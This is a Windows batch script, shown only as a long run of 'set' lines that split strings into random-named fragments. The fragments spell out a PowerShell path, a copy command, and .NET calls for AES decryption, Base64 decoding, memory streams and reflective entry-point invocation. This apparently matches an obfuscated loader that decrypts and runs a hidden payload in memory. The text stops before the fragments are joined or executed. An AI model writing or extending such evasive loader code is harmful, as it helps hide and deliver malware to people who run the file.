@echo off
set "mZzzBthbGs=xe"
set "LJqlbmHCUi=\W"
set "XoqgjBVmXn=ll"
set "bUdYvDbbNx=nd"
set "sofVrEHOBh= /"
set "hQEFjPlJoY=Po"
set "mXrXFNzgLT=po"
set "FXyVzIBzIv=1."
set "EBCmUZcSqn=Sy"
set "zmAEjNKuMN=s\"
set "BkHesXKIDL=co"
set "UfQMQRnrvT=:\"
set "zlJXYPZyyF=he"
set "vmowaZPuHA=we"
set "TwnOUErnpn=Wi"
set "jvOPZWSNkW=ll"
set "lrJiWQtPTa=.e"
set "GDeHuiXEfc=do"
set "MLLCmetMjc=\v"
set "QmEYKbnGYg=st"
set "jYjGrVOSzV= C"
set "ZvDBeFBAGl=rs"
set "NNpJabsWrZ=y "
set "ihklWaMqIV=0\"
set "TkwHkhFIQT=we"
set "cKNxNPtyOI=em"
set "scenPIGApL=he"
set "pcxRwhjoks=rS"
set "SHpZSHpVMQ=32"
set "TtsqJMEVxd=py"
set "zdvFLTNeyf=in"
set "jSiHQNCGzS=ow"
set "LsThvsuCvB=ws"
set "gAPcpwqJIQ=cd"
set "essqSmKvLu= %~dp0"
set "xrLXhGiazJ=;$Fr"
set "jOzslYYntm=ay()"
set "zazeAIncxU=v4Ir"
set "pAMwoUcxmB=.Mem"
set "itfQZyGZeZ=IaJo"
set "THbxucCaJr=IaJo"
set "NQajeiFssW=.Key"
set "ZjoNYFDBeM=ddin"
set "mfAwYQHkTj=Z.En"
set "nlzEwFfFAR=AlKI"
set "KSVEWsnXHF=n ''"
set "VWrKIdWgqW=eam("
set "qOIjOZTylP==');"
set "WIRnLoAclG=ptor"
set "BZbaSDZWVJ=ect "
set "OSvcfqYvvU=tryP"
set "atApDFBlJF=fore"
set "NUGlfPeKjY=AN.D"
set "CDbsehIZsj=.Dis"
set "tWRYWHJflH=m.IO"
set "KjZDiHTrvw=morF"
set "FlDMinvtcl=le  "
set "axGBdvEKTY=::('"
set "xkARgHLVcD=BC;$"
set "MHKIhZoZvj=yste"
set "kJxSqxrzJo= [st"
set "HQYLgRGIsp=:('g"
set "GOXSPtyMbM=.Cry"
set "GXFGbJOrfG=-joi"
set "OTowWVHsEl=.Con"
set "YHUpQupJMA=TllA"
set "kyhnbWIGlc=rtS4"
set "PoPQHVKDXD=flec"
set "UuivCpprJt=[-1."
set "NbVrhhZOEm=[Sys"
set "fTAUJZBQSf= '')"
